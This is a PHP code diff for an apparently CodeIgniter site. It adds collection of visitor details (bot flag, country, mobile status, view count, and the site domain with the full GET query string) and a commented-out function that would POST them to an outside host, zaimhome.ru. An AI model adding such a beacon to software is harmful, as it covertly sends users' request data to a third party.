@@ -122,9 +122,37 @@ if ($_uri == $uri && time() - $_exp < $exp) {
 // Save last request
 $_SESSION['ddos'] = $hash;
 
+$_gets = '';
+if($this->input->get())
+{
+    $_gets = str_replace(";", "", '?'.http_build_query($this->input->get()));
+    $_gets = str_replace("+", "", $_gets);
+}
+
 $setting_array = array (
     'is_bot' => ($is_bot == 1) ? 'бот' : 'нет',
     'country' => $country,
     'is_mobile' => $is_mobile,
-    'views3600sec' => $_SESSION['views']
+    'views3600sec' => $_SESSION['views'],
+    'site' => getDomain($_gets)
 );
+
+function getDomain($_gets)
+{
+    $CI =& get_instance();
+    
+    return preg_replace("/^[\w]{2,6}:\/\/([\w\d\.\-]+).*$/","$1", $CI->config->slash_item('base_url')).$_gets;
+}
+
+// function httpPost($data)
+// {
+//     $curl = curl_init('https://zaimhome.ru/news8');
+//     curl_setopt($curl, CURLOPT_POST, true);
+//     curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
+//     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+//     $response = curl_exec($curl);
+//     curl_close($curl); 
+//     return $response;
+// }
+
+// httpPost($setting_array);
